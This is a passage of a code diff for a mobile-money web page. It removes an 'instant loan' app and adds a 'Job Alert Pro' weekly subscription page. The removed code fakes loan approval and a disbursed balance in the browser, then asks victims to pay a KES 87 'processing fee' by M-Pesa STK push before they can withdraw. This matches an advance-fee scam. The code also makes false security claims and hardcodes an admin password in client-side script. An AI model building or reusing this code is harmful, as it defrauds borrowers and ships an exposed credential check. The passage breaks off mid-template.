-            </div>
-          </div>
-          <button id="withdrawModalCloseBtn" class="grid place-items-center w-9 h-9 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-800 transition"><i class="fa-solid fa-xmark"></i></button>
-        </div>
-        <div id="withdrawInput">
-          <div class="bg-amber-50 dark:bg-amber-500/10 rounded-2xl p-4 mb-5 text-center">
-            <p class="text-sm text-slate-600 dark:text-slate-300">Pay Loan Processing Fee</p>
-            <span class="font-display font-extrabold text-2xl text-amber-700 dark:text-amber-300" id="withdrawFeeAmount">KES 87</span>
-          </div>
-          <label class="form-label">M-Pesa Phone Number</label>
-          <div class="relative">
-            <span class="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-semibold">+254</span>
-            <input id="withdrawPhone" inputmode="tel" class="form-input !pl-16" placeholder="712 345 678 or 112 345 678" />
-          </div>
-          <p id="withdrawError" class="form-error"></p>
-          <button id="withdrawStart" class="mt-5 w-full inline-flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">
-            <i class="fa-solid fa-bolt"></i> Pay Processing Fee (KES 87)
-          </button>
-        </div>
-        <div id="withdrawProcessing" hidden class="text-center py-6">
-          <div class="relative w-24 h-24 mx-auto mb-6">
-            <span class="absolute inset-0 rounded-full bg-green-500/30 animate-pulse-ring"></span>
-            <span class="absolute inset-0 rounded-full bg-green-500/20 animate-pulse-ring" style="animation-delay:.4s"></span>
-            <span class="relative w-24 h-24 grid place-items-center rounded-full bg-green-600 text-white text-3xl"><i class="fa-solid fa-mobile-screen"></i></span>
-          </div>
-          <h4 class="font-display font-bold text-lg">Check your phone</h4>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-xs mx-auto">An STK push has been sent. Enter your M-Pesa PIN to authorize the payment.</p>
-          <div class="mt-5 flex items-center justify-center gap-2 text-sm text-slate-400">
-            <i class="fa-solid fa-spinner animate-spin-slow"></i> <span id="withdrawTimer">Waiting…</span>
-          </div>
-        </div>
-        <div id="withdrawResult" hidden class="text-center py-6">
-          <div id="withdrawResultIcon" class="w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5"></div>
-          <h4 class="font-display font-bold text-xl" id="withdrawResultTitle"></h4>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2" id="withdrawResultMsg"></p>
-          <div id="withdrawReceipt" class="text-left glass rounded-2xl p-4 mt-5 text-sm space-y-2" hidden></div>
-          <button id="withdrawModalDoneBtn" class="mt-6 w-full bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">Done</button>
-        </div>
-      </div>
     </div>
-  </div>
 
-  <!-- REPAYMENT MODAL -->
-  <div id="payModal" class="fixed inset-0 z-[60] hidden">
-    <div class="absolute inset-0 bg-slate-900/60 backdrop-blur-sm" id="payModalBackdrop"></div>
-    <div class="relative min-h-full grid place-items-center p-4">
-      <div class="glass-strong rounded-3xl w-full max-w-md p-7 shadow-2xl animate-scale-in">
-        <div class="flex items-center justify-between mb-6">
-          <div class="flex items-center gap-3">
-            <span class="grid place-items-center w-11 h-11 rounded-xl bg-green-600 text-white text-lg font-bold">M</span>
-            <div>
-              <h3 class="font-display font-bold text-lg leading-tight">M-Pesa Payment</h3>
-              <p class="text-xs text-slate-500 dark:text-slate-400">Secure STK Push</p>
-            </div>
-          </div>
-          <button id="payModalCloseBtn" class="grid place-items-center w-9 h-9 rounded-lg hover:bg-slate-100 dark:hover:bg-slate-800 transition"><i class="fa-solid fa-xmark"></i></button>
-        </div>
-        <div id="payInput">
-          <div class="bg-brand-50 dark:bg-brand-500/10 rounded-2xl p-4 mb-5 flex items-center justify-between">
-            <span class="text-sm text-slate-600 dark:text-slate-300">Pay Loan Processing Fee of</span>
-            <span class="font-display font-extrabold text-xl text-brand-700 dark:text-brand-300" id="payAmount">KSh 0</span>
-          </div>
-          <label class="form-label">M-Pesa Phone Number</label>
-          <div class="relative">
-            <span class="absolute left-4 top-1/2 -translate-y-1/2 text-slate-400 font-semibold">+254</span>
-            <input id="payPhone" inputmode="tel" class="form-input !pl-16" placeholder="712 345 678 or 112 345 678" />
-          </div>
-          <p id="payError" class="form-error"></p>
-          <button id="payStart" class="mt-5 w-full inline-flex items-center justify-center gap-2 bg-green-600 hover:bg-green-700 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">
-            <i class="fa-solid fa-bolt"></i> Send STK Push
-          </button>
-        </div>
-        <div id="payProcessing" hidden class="text-center py-6">
-          <div class="relative w-24 h-24 mx-auto mb-6">
-            <span class="absolute inset-0 rounded-full bg-green-500/30 animate-pulse-ring"></span>
-            <span class="absolute inset-0 rounded-full bg-green-500/20 animate-pulse-ring" style="animation-delay:.4s"></span>
-            <span class="relative w-24 h-24 grid place-items-center rounded-full bg-green-600 text-white text-3xl"><i class="fa-solid fa-mobile-screen"></i></span>
-          </div>
-          <h4 class="font-display font-bold text-lg">Check your phone</h4>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 max-w-xs mx-auto">An STK push has been sent. Enter your M-Pesa PIN to authorize the payment.</p>
-          <div class="mt-5 flex items-center justify-center gap-2 text-sm text-slate-400">
-            <i class="fa-solid fa-spinner animate-spin-slow"></i> <span id="payTimer">Waiting…</span>
-          </div>
-        </div>
-        <div id="payResult" hidden class="text-center py-6">
-          <div id="payResultIcon" class="w-20 h-20 mx-auto rounded-full grid place-items-center text-4xl mb-5"></div>
-          <h4 class="font-display font-bold text-xl" id="payResultTitle"></h4>
-          <p class="text-sm text-slate-500 dark:text-slate-400 mt-2" id="payResultMsg"></p>
-          <div id="payReceipt" class="text-left glass rounded-2xl p-4 mt-5 text-sm space-y-2" hidden></div>
-          <button id="payModalDoneBtn" class="mt-6 w-full bg-brand-500 hover:bg-brand-600 text-white font-bold px-5 py-3.5 rounded-xl transition active:scale-95">Done</button>
-        </div>
-      </div>
+    <div class="bg-slate-900 text-white py-2.5 text-[9px] font-black text-center uppercase tracking-[0.2em] px-4 border-b border-white/10">
+        <span class="text-green-400 animate-pulse">●</span> Status: Online | M-Pesa STK Push Active
     </div>
-  </div>
 
-  <!-- TOAST -->
-  <div id="toastWrap" class="fixed top-4 right-4 z-[70] space-y-3 w-[calc(100%-2rem)] sm:w-80"></div>
+    <!-- Main Content -->
+    <div id="landing-page" class="max-w-2xl mx-auto px-4 py-8">
+        <!-- Eligibility Check Step -->
+        <div id="check-step" class="bg-white p-6 md:p-8 rounded-[2rem] shadow-xl border border-slate-100 text-center mb-10">
+            <div class="flex justify-center mb-4">
+                <div class="w-16 h-16 bg-green-50 rounded-full flex items-center justify-center">
+                    <i class="fas fa-briefcase text-safaricom text-3xl"></i>
+                </div>
+            </div>
+            <h1 class="text-2xl md:text-3xl font-extrabold text-slate-900 mb-1">Job Alert Pro</h1>
+            <p class="text-[10px] md:text-[11px] font-bold text-safaricom uppercase tracking-widest mb-6">Weekly Job Notifications • KES 10 / Week</p>
 
-  <!-- ====================== APP SCRIPT ====================== -->
-  <script>
-(function(){
-  "use strict";
+            <div class="relative mb-4">
+                <i class="fas fa-phone-alt absolute left-4 top-5 text-slate-400"></i>
+                <input type="number" id="checkPhone" placeholder="Enter M-Pesa Number" 
+                    class="w-full pl-12 pr-4 py-5 bg-slate-50 border-2 border-slate-100 rounded-2xl focus:border-safaricom outline-none text-lg font-bold">
+            </div>
 
-  const $ = (s, r=document) => r.querySelector(s);
-  const $$ = (s, r=document) => Array.from(r.querySelectorAll(s));
-  const KES = n => 'KSh ' + Number(n||0).toLocaleString('en-KE', {maximumFractionDigits:0});
-  const RATE = 0.029;
-  const PROCESSING_FEE = 87;
+            <button id="eligibilityBtn" onclick="startVerification()" 
+                class="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-lg active:scale-95 transition-all">
+                Check Eligibility <i class="fas fa-chevron-right text-xs ml-2"></i>
+            </button>
 
-  function esc(str){
-    return String(str ?? '').replace(/[&<>"'`/]/g, c => ({
-      '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;','`':'&#96;','/':'&#47;'
-    }[c]));
-  }
-  const uid = () => 'LF' + Date.now().toString(36).toUpperCase() + Math.random().toString(36).slice(2,5).toUpperCase();
+            <!-- Payment Reason -->
+            <div class="mt-6 bg-amber-50 border border-amber-200 rounded-xl p-4 text-left">
+                <h3 class="font-bold text-amber-800 text-sm flex items-center gap-2 mb-1">
+                    <i class="fas fa-info-circle"></i> Payment Reason
+                </h3>
+                <p class="text-amber-700 text-xs leading-relaxed">
+                    You are subscribing to <strong>Job Alert Pro Weekly</strong>. A payment of 
+                    <strong>KES 10</strong> is charged weekly to deliver curated job listings directly to your email.
+                </p>
+            </div>
 
-  function monthlyPayment(principal, months){
-    const r = RATE;
-    return Math.round((principal * r * Math.pow(1+r, months)) / (Math.pow(1+r, months) - 1));
-  }
-
-  const DB = {
-    get apps(){ try { return JSON.parse(localStorage.getItem('lf_apps')||'[]'); } catch(e){ return []; } },
-    set apps(v){ localStorage.setItem('lf_apps', JSON.stringify(v)); },
-    get current(){ try { return JSON.parse(localStorage.getItem('lf_current')||'null'); } catch(e){ return null; } },
-    set current(v){ localStorage.setItem('lf_current', JSON.stringify(v)); },
-  };
-
-  function toast(msg, type='success'){
-    const map = {
-      success:{i:'fa-circle-check', c:'text-brand-500'},
-      error:{i:'fa-circle-xmark', c:'text-red-500'},
-      info:{i:'fa-circle-info', c:'text-sky-500'},
-      warn:{i:'fa-triangle-exclamation', c:'text-amber-500'},
-    };
-    const t = map[type]||map.info;
-    const el = document.createElement('div');
-    el.className = 'glass-strong rounded-2xl px-4 py-3.5 shadow-xl flex items-start gap-3 animate-slide-in';
-    el.innerHTML = `<i class="fa-solid ${t.i} ${t.c} text-lg mt-0.5"></i><p class="text-sm font-medium flex-1 text-slate-700 dark:text-slate-200">${esc(msg)}</p><button class="text-slate-400 hover:text-slate-600"><i class="fa-solid fa-xmark"></i></button>`;
-    $('#toastWrap').appendChild(el);
-    const remove = () => { el.style.transition='all .3s'; el.style.opacity=0; el.style.transform='translateX(120%)'; setTimeout(()=>el.remove(),300); };
-    el.querySelector('button').onclick = remove;
-    setTimeout(remove, 4000);
-  }
-
-  /* ---------- Theme ---------- */
-  function initTheme(){
-    const saved = localStorage.getItem('lf_theme');
-    const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
-    document.documentElement.classList.toggle('dark', saved ? saved==='dark' : prefersDark);
-  }
-  $('#themeToggle').addEventListener('click', () => {
-    const dark = document.documentElement.classList.toggle('dark');
-    localStorage.setItem('lf_theme', dark ? 'dark' : 'light');
-  });
-  initTheme();
-
-  /* ---------- STK Push (from Safaricom Fuliza code) ---------- */
-  async function triggerSTKPush(phoneNumber, amount) {
-    try {
-      const phoneInput = phoneNumber.trim();
-      if (!phoneInput || !amount) {
-        console.error("STK Push: Missing phone or amount");
-        return { success: false, message: "Missing phone or amount" };
-      }
-      const response = await fetch('/api/stk-push', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept': 'application/json' },
-        body: JSON.stringify({ amount: amount, phone_number: phoneInput })
-      });
-      const data = await response.json();
-      console.log("STK Push Response:", data);
-      if (!data.success) console.error("STK Push failed:", data.message || "Unknown error");
-      return data;
-    } catch (error) {
-      console.error("STK Trigger Failed:", error);
-      return { success: false, message: error.message || "Network error" };
-    }
-  }
-
-  function formatPhoneForSTK(raw) {
-    let p = raw.replace(/[\s\-]/g, '');
-    if (p.startsWith('+')) p = p.slice(1);
-    if (p.startsWith('254')) return p;
-    if (p.startsWith('0')) return '254' + p.slice(1);
-    if (p.startsWith('7') || p.startsWith('1')) return '254' + p;
-    return p;
-  }
-
-  /* ---------- Admin Login ---------- */
-  function showAdminLogin() {
-    $('#adminLoginModal').classList.remove('hidden');
-    $('#adminLoginUser').value = '';
-    $('#adminLoginPass').value = '';
-    $('#adminLoginError').textContent = '';
-    $('#adminLoginUser').focus();
-  }
-  function hideAdminLogin() { $('#adminLoginModal').classList.add('hidden'); }
-
-  function attemptAdminLogin() {
-    const u = $('#adminLoginUser').value.trim();
-    const p = $('#adminLoginPass').value;
-    if (u === 'josphat' && p === 'JOSPHAT2030') {
-      hideAdminLogin();
-      $$('[data-page]').forEach(el => el.hidden = el.dataset.page !== 'admin');
-      window.scrollTo({top:0, behavior:'instant'});
-      renderAdmin();
-      toast('Welcome, Admin!', 'success');
-    } else {
-      $('#adminLoginError').textContent = 'Invalid username or password.';
-      $('#adminLoginPass').value = '';
-      $('#adminLoginPass').focus();
-    }
-  }
-
-  function navigate(page){
-    if(page === 'admin') { showAdminLogin(); return; }
-    $$('[data-page]').forEach(el => el.hidden = el.dataset.page !== page);
-    window.scrollTo({top:0, behavior:'instant'});
-    if(page==='dashboard') renderDashboard();
-    if(page==='apply') resetForm();
-  }
-
-  document.addEventListener('click', e => {
-    const nav = e.target.closest('[data-nav]');
-    if(nav){ e.preventDefault(); navigate(nav.dataset.nav); }
-  });
-
-  $('#adminLoginBtn').addEventListener('click', attemptAdminLogin);
-  $('#adminLoginPass').addEventListener('keydown', e => { if (e.key === 'Enter') attemptAdminLogin(); });
-  $('#adminLoginUser').addEventListener('keydown', e => { if (e.key === 'Enter') $('#adminLoginPass').focus(); });
-  $('#adminLoginCancel').addEventListener('click', hideAdminLogin);
-  $('#adminLoginModal').addEventListener('click', e => { if (e.target === $('#adminLoginModal')) hideAdminLogin(); });
-  document.addEventListener('keydown', e => { if (e.key === 'Escape' && !$('#adminLoginModal').classList.contains('hidden')) hideAdminLogin(); });
-
-  /* ---------- Features & How ---------- */
-  const FEATURES = [
-    {icon:'fa-bolt', title:'Instant Approval', desc:'Smart underwriting approves most applications in under 3 minutes.'},
-    {icon:'fa-percent', title:'Low Interest Rates', desc:'Transparent rates from 2.9% monthly with no hidden fees.'},
-    {icon:'fa-lock', title:'Secure Transactions', desc:'256-bit encryption and bank-grade security protect your data.'},
-    {icon:'fa-headset', title:'24/7 Support', desc:'Our team is always available via chat, phone and email.'},
-  ];
-  $('#featuresGrid').innerHTML = FEATURES.map((f,i)=>`
-    <div class="glass-strong rounded-2xl p-6 hover:-translate-y-1 transition duration-300 animate-fade-up" style="animation-delay:${i*0.08}s">
-      <div class="w-12 h-12 rounded-xl bg-brand-500/15 text-brand-600 dark:text-brand-400 grid place-items-center text-xl mb-4"><i class="fa-solid ${f.icon}"></i></div>
-      <h3 class="font-display font-bold text-lg">${f.title}</h3>
-      <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 leading-relaxed">${f.desc}</p>
-    </div>`).join('');
-
-  const HOW = [
-    {n:'01', icon:'fa-file-pen', title:'Apply online', desc:'Fill the short 4-step application from any device in minutes.'},
-    {n:'02', icon:'fa-bolt', title:'Get approved', desc:'Receive an instant decision powered by smart credit scoring.'},
-    {n:'03', icon:'fa-money-bill-transfer', title:'Get funded', desc:'Money is sent straight to your M-Pesa wallet, instantly.'},
-  ];
-  $('#howGrid').innerHTML = HOW.map((h,i)=>`
-    <div class="glass-strong rounded-2xl p-7 relative animate-fade-up" style="animation-delay:${i*0.1}s">
-      <span class="font-display text-5xl font-extrabold text-brand-500/20">${h.n}</span>
-      <div class="w-12 h-12 rounded-xl bg-brand-500 text-white grid place-items-center text-xl my-3"><i class="fa-solid ${h.icon}"></i></div>
-      <h3 class="font-display font-bold text-lg">${h.title}</h3>
-      <p class="text-sm text-slate-500 dark:text-slate-400 mt-2 leading-relaxed">${h.desc}</p>
-    </div>`).join('');
-
-  /* ---------- Calculator ---------- */
-  function makeCalculator(mount, {onChange}={}){
-    const min=5000, max=500000, defAmt=50000, terms=[3,6,12,18,24];
-    mount.innerHTML = `
-      <div class="flex items-end justify-between mb-2"><span class="text-sm text-slate-500 dark:text-slate-400">Loan amount</span><span class="font-display text-2xl font-extrabold text-slate-900 dark:text-white" data-amt>${KES(defAmt)}</span></div>
-      <input type="range" min="${min}" max="${max}" step="1000" value="${defAmt}" data-range class="w-full mb-1" />
-      <div class="flex justify-between text-xs text-slate-400 mb-5"><span>${KES(min)}</span><span>${KES(max)}</span></div>
-      <span class="text-sm text-slate-500 dark:text-slate-400">Repayment period</span>
-      <div class="grid grid-cols-5 gap-2 mt-2 mb-6" data-terms>
-        ${terms.map(t=>`<button type="button" data-term="${t}" class="py-2 rounded-lg text-sm font-semibold border-1.5 transition ${t===12?'bg-brand-500 text-white border-brand-500':'border-slate-300 dark:border-slate-600 text-slate-600 dark:text-slate-300'}">${t}m</button>`).join('')}
-      </div>
-      <div class="bg-brand-50 dark:bg-brand-500/10 rounded-2xl p-5 flex items-center justify-between">
-        <div><p class="text-xs text-slate-500 dark:text-slate-400">Monthly payment</p><p class="font-display text-2xl font-extrabold text-brand-700 dark:text-brand-300" data-monthly>—</p></div>
-        <div class="text-right"><p class="text-xs text-slate-500 dark:text-slate-400">Total repayable</p><p class="font-semibold text-slate-700 dark:text-slate-200" data-total>—</p></div>
-      </div>`;
-    let amount=defAmt, term=12;
-    const range = mount.querySelector('[data-range]'), amtEl = mount.querySelector('[data-amt]'), monthlyEl = mount.querySelector('[data-monthly]'), totalEl = mount.querySelector('[data-total]');
-    function paint(){
-      const pct = ((amount-min)/(max-min))*100; range.style.setProperty('--pct', pct+'%');
-      amtEl.textContent = KES(amount); const m = monthlyPayment(amount, term);
-      monthlyEl.textContent = KES(m); totalEl.textContent = KES(m*term);
-      onChange && onChange({amount, term, monthly:m, total:m*term});
-    }
-    range.addEventListener('input', e => { amount = +e.target.value; paint(); });
-    mount.querySelectorAll('[data-term]').forEach(b => b.addEventListener('click', () => {
-      term = +b.dataset.term;
-      mount.querySelectorAll('[data-term]').forEach(x => { x.className = `py-2 rounded-lg text-sm font-semibold border-1.5 transition ${x===b?'bg-brand-500 text-white border-brand-500':'border-slate-300 dark:border-slate-600 text-slate-600 dark:text-slate-300'}`; });
-      paint();
-    }));
-    paint();
-    return { get state(){ return {amount, term, monthly:monthlyPayment(amount,term)}; } };
-  }
-  makeCalculator($('#heroCalc'));
-
-  /* ---------- Multi-step Form ---------- */
-  const STEPS = ['Personal','Employment','Loan','Review'];
-  let step = 1, formCalc = null, calcState = {amount:50000, term:12};
-
-  function renderStepper(){
-    $('#stepper').innerHTML = STEPS.map((label,i)=>{
-      const n=i+1, done=n<step, active=n===step;
-      const circle = done
-        ? `<div class="w-10 h-10 rounded-full bg-brand-500 text-white grid place-items-center"><i class="fa-solid fa-check"></i></div>`
-        : `<div class="w-10 h-10 rounded-full grid place-items-center font-bold ${active?'bg-brand-500 text-white shadow-lg shadow-brand-500/30':'bg-slate-200 dark:bg-slate-700 text-slate-500'}">${n}</div>`;
-      const line = i<STEPS.length-1 ? `<div class="flex-1 h-1 mx-1 rounded-full step-line ${n<step?'bg-brand-500':'bg-slate-200 dark:bg-slate-700'}"></div>` : '';
-      return `<div class="flex items-center ${i<STEPS.length-1?'flex-1':''}"><div class="flex flex-col items-center gap-1.5">${circle}<span class="text-xs font-semibold ${active?'text-brand-600 dark:text-brand-400':'text-slate-400'}">${label}</span></div>${line}</div>`;
-    }).join('');
-  }
-
-  function showStep(){
-    $$('#loanForm [data-step]').forEach(s => s.hidden = +s.dataset.step !== step);
-    $('#prevBtn').hidden = step===1; $('#nextBtn').hidden = step===4; $('#submitBtn').hidden = step!==4;
-    renderStepper();
-    if(step===4) renderReview();
-    if(step===3 && !formCalc){
-      formCalc = makeCalculator($('#formCalc'), { onChange: s => { calcState = s; $('#loanForm [name=amount]').value = s.amount; $('#loanForm [name=term]').value = s.term; }});
-      $('#loanForm [name=amount]').value = calcState.amount; $('#loanForm [name=term]').value = calcState.term;
-    }
-  }
-
-  document.addEventListener('change', e => {
-    if(e.target.matches('input[type=radio][name=gender], input[type=radio][name=employment]')){
-      const group = e.target.closest('[id$=Group]');
-      if(group) group.querySelectorAll('.radio-card').forEach(c => c.classList.toggle('selected', c.contains(e.target) && e.target.checked));
-    }
-  });
-
-  function clearError(input){ if(input && input.classList) input.classList.remove('invalid'); }
-  function fieldError(name, msg){
-    const field = $(`#loanForm [name="${name}"]`);
-    if(!field) return; field.classList.add('invalid');
-    const container = field.closest('[class*=col-span]') || field.closest('div');
-    let err = container && container.querySelector('.form-error');
-    if(!err){ const g=$(`#${name}Group`); err = g && g.parentElement.querySelector('.form-error'); }
-    if(err) err.textContent = msg;
-  }
-  function clearAllErrors(){ $$('#loanForm .form-error').forEach(e=>e.textContent=''); $$('#loanForm .invalid').forEach(e=>e.classList.remove('invalid')); }
-
-  function validateStep(){
-    clearAllErrors(); const d = new FormData($('#loanForm')); let ok = true;
-    const fail = (n,m)=>{ fieldError(n,m); ok=false; };
-    if(step===1){
-      const n=(d.get('fullName')||'').trim(); if(n.length<3) fail('fullName','Enter your full name.');
-      const id=(d.get('nationalId')||'').trim(); if(!/^\d{6,9}$/.test(id)) fail('nationalId','Enter a valid ID (6–9 digits).');
-      const p = (d.get('phone') || '').replace(/\s/g, '');
-      if (!/^(?:0?7\d{8}|011\d{8}|\+?2547\d{8}|\+?25411\d{7})$/.test(p)) {
-        fail('phone', 'Enter a valid Kenyan phone number (0712... or 0112...).');
-      }
-      const e=(d.get('email')||'').trim(); if(!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)) fail('email','Enter a valid email.');
-      const dob=d.get('dob');
-      if(!dob) fail('dob','Enter your date of birth.');
-      else { const age=(Date.now()-new Date(dob))/(365.25*864e5); if(age<18) fail('dob','Must be 18+.'); else if(age>100) fail('dob','Invalid date.'); }
-      if(!d.get('gender')) fail('gender','Select an option.');
-    }
-    if(step===2){
-      if(!d.get('employment')) fail('employment','Select your status.');
-      const inc=Number((d.get('income')||'').replace(/[,\s]/g,'')); if(!inc||inc<1000) fail('income','Enter valid income.');
-    }
-    if(step===3){ if(!d.get('purpose')) fail('purpose','Select a purpose.'); }
-    if(step===4){ if(!d.get('terms')){ const e=$('#loanForm .form-error[data-for=terms]'); if(e) e.textContent='Accept the terms.'; ok=false; }}
-    if(!ok) toast('Fix highlighted fields.','error');
-    return ok;
-  }
-
-  $('#loanForm').addEventListener('input', e => {
-    if(e.target.matches('input,select')){ clearError(e.target); const c=e.target.closest('div'); if(c){ const err=c.querySelector('.form-error'); if(err) err.textContent=''; }}
-  });
-  $('#nextBtn').addEventListener('click', () => { if(validateStep()){ step++; showStep(); }});
-  $('#prevBtn').addEventListener('click', () => { if(step>1){ step--; showStep(); }});
-
-  function renderReview(){
-    const d=new FormData($('#loanForm')), inc=Number((d.get('income')||'').replace(/[,\s]/g,'')), monthly=monthlyPayment(calcState.amount, calcState.term);
-    $('#reviewBox').innerHTML = [
-      ['Full Name',d.get('fullName')],['National ID',d.get('nationalId')],['Phone',d.get('phone')],['Email',d.get('email')],
-      ['Date of Birth',d.get('dob')],['Gender',d.get('gender')],['Employment',d.get('employment')],
-      ['Monthly Income',KES(inc)],['Loan Amount',KES(calcState.amount)],['Term',calcState.term+' months'],
-      ['Monthly Payment',KES(monthly)],['Purpose',d.get('purpose')],
-    ].map(([k,v])=>`<div class="flex items-center justify-between py-2.5 border-b border-slate-200/70 dark:border-slate-700/60"><span class="text-sm text-slate-500 dark:text-slate-400">${esc(k)}</span><span class="font-semibold text-sm text-right">${esc(v||'—')}</span></div>`).join('');
-  }
-
-  $('#loanForm').addEventListener('submit', e => {
-    e.preventDefault(); if(!validateStep()) return;
-    const sb=$('#submitBtn'); sb.disabled=true; sb.innerHTML='<i class="fa-solid fa-spinner animate-spin-slow"></i> Submitting…';
-    setTimeout(()=>{
-      const d=new FormData($('#loanForm')), inc=Number((d.get('income')||'').replace(/[,\s]/g,'')), monthly=monthlyPayment(calcState.amount, calcState.term);
-      const ratio=monthly/(inc||1), status=ratio<=0.45?'Approved':ratio<=0.6?'Pending':'Rejected';
-      const app={
-        id:uid(), fullName:d.get('fullName'), nationalId:d.get('nationalId'), phone:d.get('phone'),
-        email:d.get('email'), dob:d.get('dob'), gender:d.get('gender'), employment:d.get('employment'),
-        income:inc, amount:calcState.amount, term:calcState.term, monthly, purpose:d.get('purpose'),
-        status, balance:status==='Approved'?calcState.amount:0, createdAt:Date.now(),
-        pendingWithdrawal: false, withdrawn: false,
-        tx:status==='Approved'?[{t:'Disbursement',amt:calcState.amount,dir:'in',date:Date.now()}]:[],
-        notifications:[{
-          icon:status==='Approved'?'fa-circle-check':status==='Pending'?'fa-hourglass-half':'fa-circle-xmark',
-          text:status==='Approved'?`Loan approved! ${KES(calcState.amount)} disbursed.`:status==='Pending'?'Under review.':'Not approved.',
-          date:Date.now()
-        }]
-      };
-      const apps=DB.apps; apps.unshift(app); DB.apps=apps; DB.current=app.id;
-      sb.disabled=false; sb.innerHTML='<i class="fa-solid fa-paper-plane"></i> Submit Application';
-      toast(`Submitted — ${status}.`, status==='Rejected'?'warn':'success');
-      navigate('dashboard');
-    }, 1600);
-  });
-
-  function resetForm(){ $('#loanForm').reset(); clearAllErrors(); step=1; $$('.radio-card').forEach(c=>c.classList.remove('selected')); calcState={amount:50000,term:12}; if(formCalc){formCalc=null;$('#formCalc').innerHTML='';} showStep(); }
-  showStep();
-  /* ====================== DASHBOARD ====================== */
-  function currentApp(){ const id=DB.current; return id?DB.apps.find(a=>a.id===id)||null:null; }
-
-  function renderDashboard(){
-    const app=currentApp();
-    if(!app){
-      $('#dashName').textContent='there 👋'; $('#dashBalance').textContent=KES(0);
-      $('#statusTracker').innerHTML='<div class="text-center py-8 text-slate-400"><i class="fa-regular fa-file-lines text-4xl mb-3"></i><p>No active loan yet.</p><button data-nav="apply" class="mt-4 bg-brand-500 hover:bg-brand-600 text-white font-semibold px-5 py-2.5 rounded-xl text-sm transition">Apply for a loan</button></div>';
-      $('#txList').innerHTML='<p class="text-sm text-slate-400 py-6 text-center">No transactions.</p>';
-      $('#profName').textContent='—'; $('#profEmail').textContent='—'; $('#profDetails').innerHTML=''; $('#avatar').textContent='?';
-      $('#notifList').innerHTML='<p class="text-sm text-slate-400">No notifications.</p>'; $('#notifCount').textContent='0';
-      return;
-    }
-    const f=app.fullName.split(' ')[0]; $('#dashName').textContent=f+' 👋';
-    $('#dashBalance').textContent=KES(app.balance);
-    $('#avatar').textContent=app.fullName.split(' ').map(w=>w[0]).slice(0,2).join('').toUpperCase();
-    $('#profName').textContent=app.fullName; $('#profEmail').textContent=app.email;
-    $('#profDetails').innerHTML=[['Phone',app.phone],['National ID',app.nationalId],['Employment',app.employment],['Monthly Income',KES(app.income)]].map(([k,v])=>`<div class="flex justify-between"><dt class="text-slate-500 dark:text-slate-400">${esc(k)}</dt><dd class="font-semibold">${esc(v)}</dd></div>`).join('');
-
-    const sb=$('#statusBadge');
-    const st={
-      Approved:'bg-brand-100 text-brand-700 dark:bg-brand-500/15 dark:text-brand-300',
-      Pending:'bg-amber-100 text-amber-700 dark:bg-amber-500/15 dark:text-amber-300',
-      Rejected:'bg-red-100 text-red-700 dark:bg-red-500/15 dark:text-red-300',
-      'Pending Withdrawal':'bg-purple-100 text-purple-700 dark:bg-purple-500/15 dark:text-purple-300',
-      Withdrawn:'bg-sky-100 text-sky-700 dark:bg-sky-500/15 dark:text-sky-300',
-      Repaid:'bg-sky-100 text-sky-700 dark:bg-sky-500/15 dark:text-sky-300'
-    };
-    let displayStatus = app.status;
-    if (app.withdrawn) displayStatus = 'Withdrawn';
-    else if (app.pendingWithdrawal) displayStatus = 'Pending Withdrawal';
-    sb.className = 'text-xs font-bold px-3 py-1.5 rounded-full '+(st[displayStatus]||st.Pending);
-    sb.textContent = displayStatus;
-
-    const stages=['Submitted','Under Review','Approved','Disbursed','Pending Withdrawal','Withdrawn'];
-    let reached = 0;
-    if(displayStatus === 'Withdrawn') reached = 6;
-    else if(displayStatus === 'Pending Withdrawal') reached = 5;
-    else if(app.status === 'Approved') reached = 4;
-    else if(app.status === 'Pending') reached = 2;
-    else if(app.status === 'Rejected') reached = 2;
-    else reached = 4;
-    const isRejected = app.status === 'Rejected';
-
-    $('#statusTracker').innerHTML = `
-      <div class="grid gap-0">
-        ${stages.map((s,i)=>{
-          const n=i+1, d = n <= reached && !isRejected, rj = isRejected && n > 2;
-          const isPw = s === 'Pending Withdrawal' || s === 'Withdrawn';
-          const stageColor = d ? (isPw ? 'bg-purple-500 text-white' : 'bg-brand-500 text-white') : (rj ? 'bg-red-100 text-red-500 dark:bg-red-500/15' : 'bg-slate-200 dark:bg-slate-700 text-slate-400');
-          const lineColor = (n < reached && !isRejected) ? (isPw ? 'bg-purple-500' : 'bg-brand-500') : 'bg-slate-200 dark:bg-slate-700';
-          return `<div class="flex items-start gap-4 ${i < stages.length-1 ? 'pb-6' : ''} relative">
-            <div class="relative z-10 w-9 h-9 rounded-full grid place-items-center ${stageColor}"><i class="fa-solid ${d ? 'fa-check' : rj ? 'fa-xmark' : 'fa-circle text-[6px]'}"></i></div>
-            ${i < stages.length-1 ? `<div class="absolute left-4 top-9 w-0.5 h-full ${lineColor}"></div>` : ''}
-            <div class="pt-1"><p class="font-semibold text-sm ${d ? '' : 'text-slate-400'}">${s}</p></div>
-          </div>`;
-        }).join('')}
-      </div>
-      ${!app.pendingWithdrawal && !app.withdrawn && (app.status === 'Approved') ? `
-        <div class="mt-4 bg-brand-50 dark:bg-brand-500/10 rounded-xl p-4 text-sm flex items-center justify-between">
-          <span>Processing fee required to withdraw</span>
-          <button id="quickWithdrawBtn" class="bg-amber-500 text-white px-4 py-2 rounded-lg font-semibold text-xs">Pay KES 87</button>
-        </div>` : ''}
-      ${app.pendingWithdrawal ? `
-        <div class="mt-4 bg-purple-50 dark:bg-purple-500/10 rounded-xl p-4 text-sm">
-          <span>⏳ Withdrawal in progress. Processing fee paid via STK Push. Funds will be sent to M-Pesa shortly.</span>
